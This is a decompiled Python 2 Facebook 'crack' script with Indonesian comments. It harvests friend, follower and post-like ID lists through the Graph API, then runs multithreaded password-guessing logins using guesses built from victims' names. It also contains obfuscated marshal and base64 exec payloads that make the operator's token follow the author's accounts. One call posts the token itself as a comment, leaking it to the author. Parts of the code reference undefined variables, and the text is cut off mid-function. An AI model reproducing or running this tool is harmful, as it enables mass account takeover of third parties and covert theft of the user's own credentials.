# uncompyle6 version 3.7.4
# Python bytecode 2.7
# by fir ganteng
# halo bang recode
# jangan di ubah lagi nanti eoro
Hj = '\x1b[1;92m'
Mt = '\x1b[0m'
import os
try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import concurrent.futures
except ImportError:
    os.system('pip2 install futures')

try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

import requests, os, re, bs4, sys, json, time, random, datetime, subprocess, logging, base64
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from time import sleep as jeda
from datetime import datetime
_ = lambda x: x
code = type(_.func_code)
_.func_code = code(0, 0, 5, 64, 'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S', ('marshal', 'zlib', 'base64', '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', None), ('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'), (), 'enc_lam.py', '<module>', 1, '\x03\x009\x01\x0f\x00', (), ())
_()
P = '\x1b[1;97m'
M = '\x1b[0;97m'
H = '\x1b[1;95m'
K = '\x1b[1;91m'
B = '\x1b[1;93m'
U = '\x1b[1;94m'
O = '\x1b[1;95m'
N = '\x1b[1;96m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
user, mi, status_foll, cr, ok, cp, id, user, loop, looping = ([], [], [], [], [], [], [], [], 0, 1)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        jeda(0.03)


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r%s[%s] Sabar kentod, sedang hapus token %s' % (P, til, o),
        sys.stdout.flush()
        jeda(1)


def folder():
    try:
        os.mkdir('hasil')
    except:
        pass

    try:
        os.mkdir('data')
    except:
        pass

    try:
        ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('data/ua.txt', 'w').write(ua_)
    except:
        pass


IP = requests.get('https://api.ipify.org/').text

def banner():
    print " \x1b[1;95m __  __                     _    \n |  \/  | __\x1b[1;94m_ _ __ ___   ___| | __\n |\x1b[1;91m |\/| |/ _ \ '_ ` _ \ / \x1b[1;94m_ \ |/ /\n | |  | |  __/ | | | | | \33[1;31m __/   < \n |_|  |_|\x1b[1;95m\___|_| |_| |_|\___|_|\_\ \n"
    print "\x1b[1;94m_______________________\x1b[1;95m__________________________/fir"

def hasil(ok, cp):
    if len(ok) != 0 or len(cp) != 0:
        print '\n\n%s[%s\xe2\x9c\x93%s] Crack selesai tod !!' % (N, H, N)
        print '[%s\xe2\x80\xa2%s] Total akun OK : %s%s%s' % (H, N, H, str(len(ok)), N)
        print '[%s\xe2\x80\xa2%s] Total akun CP : %s%s%s\n' % (H, N, K, str(len(cp)), N)
        exit()
    else:
        print '\n\n[%s!%s] Sabar dan coba lagi bree:)' % (M, N)
        exit()


header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

def masuk():
    os.system('clear')
    banner()
    jalan('\n%s[1] Login dengan token\n[%s0%s] Keluar (%slogout dari script%s)' % (P, M, P, H, P))
    firrxd = raw_input('\n%s[%s?%s] Pilih : %s' % (P, K, P, H))
    if firrxd in '':
        print '%s[\xe2\x80\xa2] Isi yang benar kentod' % M
        exit()
    elif firrxd in ('1', '01'):
        jalan('\n%s[%s!%s] Ingat, Harus Pakai Akun Tumbal !!' % (P, K, P))
        fir88__sayang__araa = raw_input('%s[%s?%s] Malak Token :  %s' % (P, K, P, H))
        if fir88__sayang__araa in '':
            print '%s[\xe2\x80\xa2] Isi yang benar kentod' % M
            exit()
        try:
            gas = requests.get('https://graph.facebook.com/me?access_token=%s' % fir88__sayang__araa).json()['name']
            print '\n%s[%s\xe2\x9c\x93%s] Login Berhasil, Mohon Tunggu...' % (P, H, P)
            jeda(1)
            open('token.txt', 'w').write(fir88__sayang__araa)
            login_xx()
            bot()
            os.system('xdg-open ')
            exec base64.b64decode('b3Muc3lzdGVtKCd4ZGctb3BlbiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcm9taS5hZnJpemFsLjEwMicpO21lbnUoKQ==')
        except (KeyError, IOError):
            print '%s[%s!%s] Token invalid tod !' % (P, M, P)
            masuk()


exec base64.b64decode('ZGVmIGxvZ2luX3h4KCk6CiAgICB0cnk6CiAgICAgICAgdG9rZW4gPSBvcGVuKCJkYXRhL3Rva2VuLnR4dCIsInIiKS5yZWFkKCkgCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDIyMDg2MTcyNTU2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBGYW5zcGFnZSBSb21pIFhECiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI4NDM0ODgwNTI5L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNjc4MDc1NjU4NjEvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIFJvbWkgQWZyaXphbCAoMjAyMSkKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDM3MjM2OTY4ODUvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIElxYmFsIGJvYnoKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNDExMjkwNDg5NDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEl3YW4gaGFkaWFuc3lhaAogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwNzUyMDIwMzQ1Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgSGFtemFoIGtpcmFuYQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjQ2MTM0NDE3OC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVW5payBST01JIEFGUklaQUwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwNzE3NDc0MjA1ODMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIERvbmlmdGZhbm55CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI5MTQzMTExNTY3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBEZW1pdCBSb21pIEFmcml6YWwKICAgICAgICByZXF1ZXN0cy5wb3N0KCdodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDE1NDAyOTkxMDgvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPSVzJyUodG9rZW4pKSAjIEhha2lraQogICAgICAgIHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDA1NTkxODM5MTI4MC9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49JXMnJSh0b2tlbikpICMgVGlhcmEgYXJ0CiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDA5Mzg0MzM4NDcwL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBJd2FuIGhhbmRpYW5zeWFoIHYyCiAgICAgICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDM2NjU1MzI1OTk2L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0lcyclKHRva2VuKSkgIyBBYnVzdG8gSmF2YQogICAgZXhjZXB0OgogICAgCXBhc3M=')
# jangan kau ubah pantek
def bot():
    try:
        token = open('token.txt', 'r').read()
    except (KeyError, IOError):
        exit(' %s[!] token kadaluwarsa!' % M)

    post = '573457507083491'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kon + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/1230470587425293/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/1230470587425293/comments/?message=' + komenn + '&access_token=' + token)
    requests.post('https://graph.facebook.com/1230470587425293/comments/?message=' + komen + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token)#prof
    requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100013031465766/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/100027558888180/subscribers?access_token=%s'%(kentod))
    requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
    requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,kentod))
    menu()


def publik(firr, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print '\n%s[%s+%s] Ketik %sme%s untuk dump id teman !' % (P, K, P, H, P)
        idt = raw_input('[?] Target id  : %s' % B)
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, firr))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s?fields=friends.limit(5001)&access_token=%s' % (idt, firr))
        z = json.loads(r.text)
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[+] Proses dump :%s %s ' % (P, H, str(len(id))),
            sys.stdout.flush();jeda(0.0050)

        bff.close()
        print '\n \n%s[%s\xe2\x9c\x93%s] Succes dump id dari %s%s' % (P, H, P, H, nm['name'])
        print '%s[%s\xe2\x80\xa2%s] Copy file dump nya :%s %s ' % (P, H, P, H, file)
        raw_input('\n%s[+] %Tekan enter %s ' % (P, K, P))
        menu()
    except Exception as e:
      exit('\n %s Ketik: python2 Memek.py'%(P))

def followers(romz, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print '\n%s[%s+%s] Ketik %sme%s jika ingin dump followers sendiri ' % (P, K, P, H, P)
        idt = raw_input('[?] Target id   : %s' % K)
        batas = raw_input('%s[?] Limit id    : %s' % (P, K))
        gas = requests.get('https://graph.facebook.com/%s?access_token=%s' % (idt, romz))
        nm = json.loads(gas.text)
        file = ('dump/' + nm['first_name'] + '.json').replace(' ', '_')
        bff = open(file, 'w')
        r = requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s' % (idt, batas, romz))
        z = json.loads(r.text)
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[+] Proses dump :%s %s ' % (P, H, str(len(id))),
            sys.stdout.flush()
            jeda(0.004)

        bff.close()
        print '\n\n%s[%s\xe2\x9c\x93%s] Succes dump id dari %s%s' % (P, H, P, H, nm['name'])
        print '%s[%s+%s] Copyfile dump nya :%s %s ' % (P, H, P, H, file)
        raw_input('\n%s[+] %sTekan enter %s ' % (P, K, P))
        menu()
    except Exception as e:
      exit('\n %s Ketik: python2 Memek.py'%(P))

def postingan(romz, headers=header):
    try:
        os.mkdir('dump')
    except:
        pass

    try:
        print '\n%s[%s!%s] Perlu di ingat, postingan wajib publik ! ' % (P, M, P)
        idt = raw_input('[?] Id postingan   : %s' % K)
        simpan = raw_input('%s[?] Nama file : %s' % (P, K))
        r = requests.get('https://graph.facebook.com/%s/likes?limit=999999&access_token=%s' % (idt, romz))
        id = []
        z = json.loads(r.text)
        file = ('dump/' + simpan + '.json').replace(' ', '_')
        bff = open(file, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            bff.write(a['id'] + '<=>' + a['name'] + '\n')
            print '\r%s[\xe2\x80\xa2] Sedang dump id :%s %s ' % (P, H, str(len(id))),
            sys.stdout.flush()
            jeda(0.004)

        bff.close()
        print '\n\n%s[%s\xe2\x9c\x93%s] Succes dump id postingan ' % (P, H, P)
        print '%s[%s+%s] Copy file dump nya :%s %s ' % (P, H, P, H, file)
        raw_input('\n%s[+] %sEnter %s ' % (P, K, P))
        menu()
    except Exception as e:
      exit('\n %s Ketik: python2 Memek.py'%(P))


class ngentod():

    def __init__(self):
        self.id = []

    def araaa(self):
        try:
            self.apk = raw_input('\n%s[?] File dump :%s ' % (P, K))
            self.id = open(self.apk).read().splitlines()
            print '%s[%s+%s] Total id  : %s%s' % (P, K, P, H, len(self.id))
        except:
            print '\n%s[%s!%s] File dump ndak ada, dump id dulu lah kentod' % (P, M, P)
            raw_input('\n%s[\xe2\x80\xa2] %sEnter %s ' % (P, K, P))
            menu()

        firrxd = raw_input('%s[?] Ingin gunakan password manual? (d/m):%s ' % (P, K))
        if firrxd in ('01', '1', 'M', 'm'):
            print '%s[%s!%s] Gunakan (koma) untuk tanda pemisah sandi' % (P, M, P, H, P)
            while True:
                pwx = raw_input('%s[?] Kata sandi :%s ' % (P, K))
                if pwx == '':
                    print '\n%s[!] jangan kosong kentod' % M
                elif len(pwx) <= 5:
                    print '\n%s[!] password minimal 6 karakter' % M
                else:

                    def firr(araa_=None):
                        ind = raw_input('\n%s[?] Metode : %s' % (P, K))
                        if ind == '':
                            print '%s[\xe2\x80\xa2] Isi yang benar kentod ' % M
                            self.zona()
                        elif ind in ('1', '01'):
                            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
                            with ThreadPoolExecutor(max_workers=20) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, firr_)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        elif ind in ('2', '02'):
                            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
                            with ThreadPoolExecutor(max_workers=20) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.b_api, indo, firr_)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        elif ind in ('3', '03'):
                            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
                            with ThreadPoolExecutor(max_workers=20) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mobile, indo, firr_)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        elif ind in ('4', '04'):
                            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
                            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
                            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
                            with ThreadPoolExecutor(max_workers=20) as (log):
                                for akun in self.id:
                                    try:
                                        indo = akun.split('<=>')[0]
                                        log.submit(self.mfb, indo, firr_)
                                    except:
                                        pass

                            os.remove(self.apk)
                            exit()
                        else:
                            print '\n %s[\xe2\x80\xa2] isi yang benar kentod' % M
                            zona()

                    print '\n%s Loading.........\n' % P
		    time.sleep(20)
                    print '\x1b[0;97m[%s1%s] Metode B-Api ' % (K, P)
                    time.sleep(0.010)
                    print '\x1b[0;97m[%s2%s] Metode Mbasic ' % (K, P)
                    time.sleep(0.015)
                    print '\x1b[0;97m[%s3%s] Metode Mobile ' % (K, P)
                    time.sleep(0.010)
                    print '\x1b[0;97m[%s4%s] Metode Mobile ' % (K, P)
                    time.sleep(0.09)
		    print '\x1b[0;97m[%s5%s] Metode Mobile ' % (K, P)
                    time.sleep(0.010)
          	    print '_____________________/fir'
  		    print '\x1b[0;97m\n[%s6%s] Metode Mobile ' % (K, P)
                    time.sleep(0.06)
		    print '\x1b[0;97m[%s7%s] Metode Mbasis  ' % (K, P)
                    time.sleep(0.06)
		    print '\x1b[0;97m[%s8%s] Metode Mbasis ' % (K, P)
                    time.sleep(0.06)
                    zona(pwx.split(','))
                    break

        elif firrxd in ('02', '2', 'D', 'd'):
            print '\n%s Loading.........\n' % P
	    time.sleep(20)
            print '\x1b[0;97m[%s1%s] Metode B-Api ' % (K, P)
            time.sleep(0.010)
            print '\x1b[0;97m[%s2%s] Metode Mbasic  ' % (K, P)
            time.sleep(0.015)
            print '\x1b[0;97m[%s3%s] Metode Mobile ' % (K, P)
            time.sleep(0.010)
            print '\x1b[0;97m[%s4%s] Metode Mobile ' % (K, P)
            time.sleep(0.09)
	    print '\x1b[0;97m[%s5%s] Metode Mobile ' % (K, P)
            time.sleep(0.015)
	    print '______________________/fir'
	    print '\x1b[0;97m\n[%s6%s] Metode Mobile ' % (K, P)
            time.sleep(0.06)
	    print '\x1b[0;97m[%s7%s] Metode Mbasis ' % (K, P)
            time.sleep(0.06)
	    print '\x1b[0;97m[%s8%s] Metode Mbasis ' % (K, P)
            time.sleep(0.06)
            self.langsung()
        else:
            print '%s[\xe2\x80\xa2] Isi yang benar kentod' % M
            jeda(2)
            menu()
        return

    def langsung(self):
        suuu = raw_input('\n%s[%s?%s] Metode :%s ' % (P, K, P, H))
        if suuu == '':
            print '%s[\xe2\x80\xa2] Isi yang benar kentod' % M
            self.langsung()
        elif suuu in ('1', '01'):
            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.b_api, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('2', '02'):
            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.b_api, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('3', '03'):
            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('4', '04'):
            print '\n%s[%s\xe2\x80\xa2%s] Akun %sOK%s saved >%s hasil/OK-%s-%s-%s.txt' % (P, K, P, H, P, H, ha, op, ta)
            print '%s[%s\xe2\x80\xa2%s] Akun %sCP %ssaved > %shasil/CP-%s-%s-%s.txt' % (P, K, P, K, P, K, ha, op, ta)
            print '%s[%s!%s] Mode pesawatkan (3 detik) setiap 3 menit !!\n' % (P, H, P)
            with ThreadPoolExecutor(max_workers=30) as (log):
                for akun in self.id:
                    try:
                        uid, name = akun.split('<=>')
                        _i_ = name.split(' ')
                        if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        else:
                            pwx = [
                             name, _i_[0] + '123', _i_[0] + '12345']
                        log.submit(self.basic, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            exit()
        elif suuu in ('5', '05'):
